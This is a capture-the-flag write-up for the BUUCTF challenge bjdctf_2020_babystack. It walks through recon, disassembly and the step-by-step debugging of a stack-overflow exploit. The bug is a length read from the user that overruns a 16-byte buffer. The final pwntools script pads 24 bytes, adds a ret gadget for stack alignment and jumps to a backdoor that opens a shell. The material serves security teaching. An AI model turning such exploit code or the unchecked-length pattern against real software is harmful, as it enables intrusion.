# bjdctf_2020_babystack (BUUCTF)

**Category:** Binary Exploitation / pwn
**Arch:** x86-64, dynamically linked, not stripped, No PIE
**Technique:** User-controlled read length → Stack Buffer Overflow → ret2text (self-contained `backdoor` function) with a stack-alignment fix

---

## 1. Recon

```bash
file ./baby
```

```
./baby: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
not stripped
```

```bash
checksec --file=baby
```

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

No canary, No PIE, not stripped — mitigation-wise this sits at the same difficulty tier as the earlier `ret2text` challenge. The interesting part is entirely in the bug itself.

## 2. Symbol table — a ready-made backdoor again

```bash
nm ./baby | grep " T "
```

```
00000000004006e6 T backdoor
0000000000400844 T _fini
0000000000400548 T _init
0000000000400840 T __libc_csu_fini
00000000004007d0 T __libc_csu_init
00000000004006fb T main
00000000004005f0 T _start
```

## 3. Disassembling `backdoor`

```bash
objdump -d ./baby --disassemble=backdoor
```

```asm
00000000004006e6 <backdoor>:
  4006e6: 55                   push   %rbp
  4006e7: 48 89 e5             mov    %rsp,%rbp
  4006ea: bf 58 08 40 00       mov    $0x400858,%edi
  4006ef: e8 9c fe ff ff       call   400590 <system@plt>
  4006f4: b8 01 00 00 00       mov    $0x1,%eax
  4006f9: 5d                   pop    %rbp
  4006fa: c3                   ret
```

```bash
objdump -s -j .rodata ./baby | grep -A1 "400850"
```

```
400850 01000200 00000000 2f62696e 2f736800  ......../bin/sh.
```

Confirmed: `edi = 0x400858` points to `"/bin/sh"`, so `backdoor()` is fully self-contained, equivalent to `system("/bin/sh")`. No ROP chain is required — only a return-address overwrite pointing at `0x4006e6`.

## 4. Disassembling `main` — a user-controlled read length

```bash
objdump -d ./baby --disassemble=main
```

Stripping out the half-dozen `puts()` calls that just print the challenge's welcome banner, the relevant sequence is:

```asm
4006ff: sub    $0x10,%rsp              ; 16 bytes reserved
40073f: movl   $0x0,-0x4(%rbp)         ; int len = 0;

; --- "Please input the length of your name:" printed here ---

40078c: lea    -0x4(%rbp),%rax
400790: mov    %rax,%rsi
400793: mov    $0x400961,%edi          ; format string, almost certainly "%d"
40079d: call   __isoc99_scanf@plt       ; scanf("%d", &len)

; --- "What's u name?" printed here ---

4007ac: mov    -0x4(%rbp),%edx         ; edx = len (attacker-controlled!)
4007af: lea    -0x10(%rbp),%rax        ; buffer address, 16 bytes reserved
4007b3: mov    %rax,%rsi
4007b6: mov    $0x0,%edi
4007c0: call   read@plt                 ; read(0, buf, len)
```

This is a meaningfully different, and more dangerous, bug pattern than the bounded-but-mismatched reads seen in earlier challenges (e.g. `read(0, buf, 0x200)` with a hardcoded, in-source constant exceeding the real buffer). Here **the length cap itself comes directly from user input** via `scanf("%d", &len)` — there's no hardcoded bound in the source at all, and no validation that `len` fits inside the 16-byte buffer. This is arguably worse than an unbounded `gets()`: with `gets`, the overflow size is only as long as whatever the attacker types; here, the attacker explicitly dictates the exact byte count `read()` will accept, giving full, deterministic control over the overflow length rather than relying on typed input length.

## 5. Offset calculation

`main` has a saved frame pointer, and the buffer sits at `rbp-0x10`:

```
padding = 0x10 (buffer-to-rbp distance) + 8 (saved rbp)
        = 16 + 8
        = 24 bytes
```

## 6. Building the exploit — iterative debugging

### First attempt — program exits early (exit code 0, no crash)

```python
payload = b"A" * 40 + p64(backdoor_addr)
p.sendline(payload)
```

Result: the program printed its prompts and then exited cleanly (`exit code 0`) before ever reaching the vulnerable `read()`. The cause: the program asks **two separate questions** —first a length via `scanf("%d", ...)`, then the actual input via `read()`— but only one `sendline()` was issued. The entire payload (starting with non-numeric `A` characters) was consumed as the answer to the `scanf("%d", ...)` prompt. `scanf` failing to parse a valid integer from non-digit input leaves the program in an inconsistent state, causing it to exit before the overflow could ever occur.

**Fix:** send the two stages separately, exactly mirroring the program's own two prompts:

```python
p.sendline(b"40")      # answer to scanf("%d", &len) — must exceed the real payload length
p.sendline(payload)    # answer to read(0, buf, len) — the actual overflow
```

### Second attempt — SIGSEGV (wrong padding length)

With the two-stage send in place, the program progressed further but crashed with `SIGSEGV`. The payload at this point used `b"A" * 40` as padding — but the correct offset, computed in section 5, is **24 bytes**, not 40. Using too much padding pushes the overwritten return address 16 bytes too far into unrelated stack memory. Correcting the padding to exactly 24 bytes resolved this crash.

### Third attempt — SIGSEGV again (stack alignment)

```python
payload = b"A" * 24 + p64(backdoor_addr)
```

Still `SIGSEGV`, with no partial output from `backdoor()` (no "ok!!"-equivalent, no shell). This matches the same stack-misalignment signature encountered in the earlier `jarvisoj_level2_x64` challenge: redirecting control flow via `ret` (rather than a proper `call`) can leave `rsp` 8 bytes off the 16-byte boundary the System V AMD64 ABI requires before a `call`, causing libc-internal SIMD instructions (e.g. `movaps`) inside `system()`'s implementation to fault.

**Fix:** a standalone `ret` gadget, found with:

```bash
ROPgadget --binary ./baby --only "ret"
```
```
0x0000000000400561 : ret
```

inserted between the padding and `backdoor_addr` — it consumes exactly 8 bytes without any other side effect, restoring 16-byte alignment:

```python
payload  = b"A" * 24
payload += p64(ret_gadget)
payload += p64(backdoor_addr)
```

This resolved the crash and produced a working shell, both locally and against the remote instance.

## 7. Full exploit

```python
from pwn import *

context.arch = 'amd64'

p = process('./baby')
# p = remote('<host>', <port>)

backdoor_addr = 0x4006e6
ret_gadget    = 0x400561   # standalone `ret`, for 16-byte stack alignment

payload  = b"A" * 24
payload += p64(ret_gadget)
payload += p64(backdoor_addr)

p.sendline(b"40")      # answer to the length prompt (scanf)
p.sendline(payload)    # answer to the name prompt (read) — triggers the overflow

p.interactive()
```

```
[+]Are u ready?
[+]Please input the length of your name:
[+]What's u name?
$ id
uid=1000(Gantosay) gid=1000(Gantosay) ...
```

## 8. Reconstructed C

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor(void)
{
    system("/bin/sh");
}

int main(void)
{
    int len;
    char buf[16];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IOLBF, 0);

    len = 0;

    puts("**********************************");
    puts("*     Welcome to the BJDCTF!     *");
    puts("* And Welcome to the bin world!  *");
    puts("*  Let's try to pwn the world!   *");
    puts("* Please told me u answer loudly!*");
    puts("[+]Are u ready?");
    puts("[+]Please input the length of your name:");

    scanf("%d", &len);

    puts("[+]What's u name?");
    read(0, buf, len);   // len is fully attacker-controlled, never validated
                          // against the real 16-byte size of buf

    return 0;
}
```

`backdoor()` is never called anywhere in this source — it exists purely as dead code the author left in, reachable only via a return-address overwrite, exactly like the earlier `ret2text` challenge.

## 9. Tools used

| Tool | Purpose |
|---|---|
| `file` | Identify architecture, linking type, strip status |
| `checksec` | Check canary / NX / PIE / RELRO |
| `nm` | Locate the unused `backdoor` function |
| `objdump -d` | Disassemble `backdoor` and `main`; identify the user-controlled read-length bug |
| `objdump -s -j .rodata` | Verify the `/bin/sh` string referenced by `backdoor` |
| `ROPgadget` | Locate a standalone `ret` gadget for stack-alignment correction |
| `pwntools` | Build, debug, and send the final two-stage exploit |

## 10. Key takeaways

- **A read-length argument taken directly from unvalidated user input is a strictly stronger bug than a hardcoded-but-oversized bound** — the attacker controls the overflow size exactly, rather than being limited to however much they can type before a delimiter.
- **When a program issues multiple, distinct input prompts (e.g. `scanf` for a length, then `read` for data), the exploit script must mirror that exact sequence with separate `sendline()` calls.** Sending everything as one combined payload causes it to be consumed by the wrong prompt, corrupting program state in ways that often look like unrelated failures (here, an unexpected clean exit rather than a crash).
- **An immediate SIGSEGV with zero output from the target function is the recurring signature of a 64-bit stack-alignment fault**, distinct from a wrong-offset crash. The fix — a standalone `ret` gadget consuming exactly 8 bytes before the real target — is the same pattern used whenever `ret`-based control-flow redirection leaves the stack misaligned.
- **Debugging an exploit methodically** (isolating each symptom — early exit, then wrong-offset crash, then alignment crash — and fixing them one at a time rather than guessing at a combined fix) made each failure traceable to a single, specific cause.
